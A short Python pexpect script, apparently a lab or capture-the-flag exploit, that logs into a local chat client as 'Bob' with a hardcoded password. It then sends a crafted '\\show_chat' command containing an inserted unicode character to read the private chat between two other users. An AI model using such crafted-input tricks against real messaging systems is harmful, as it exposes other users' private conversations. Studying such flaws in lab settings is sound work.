import pexpect
import argparse
import sys
import os


def main():
    # Parse the command line args
    
    parser = argparse.ArgumentParser(description="Get the chat")
    parser.add_argument("user1", help="Please give the first user")
    parser.add_argument("user2", help="Please give second user")
    
    args = parser.parse_args()
    
    try:
        program = pexpect.spawn("./client.py", timeout=10)
    except Exception as e:
        print(f"Couldn't start client.py: {e}")
        return
        
    program.logfile = sys.stdout
    try:
        #Login as Bob
        program.expect("To exit type: \\exit")
        program.sendline("login")
        
        program.expect("Enter Username:")
        program.sendline("Bob")
        
        program.expect("Enter Password:")
        program.sendline("IamBob")
        
        #begin talking to self to preform the attack
        program.sendline("Bob")
        
        program.expect('- Type \\test_mod("wanted mod") to change the following text')
        user1 = args.user1
        user2 = args.user2
        
        program.sendline(f"\\show_chat愛({user1}, {user2})")
        
        chat_output = program.before.strip()
        
        print(f"Chat output: \n {chat_output}")
        
    except pexpect.TIMEOUT:
        print("Timed out waiting for login prompt.")
    except pexpect.EOF:
        print("Program exited unexpectedly.")


if __name__ == "__main__":
    main()
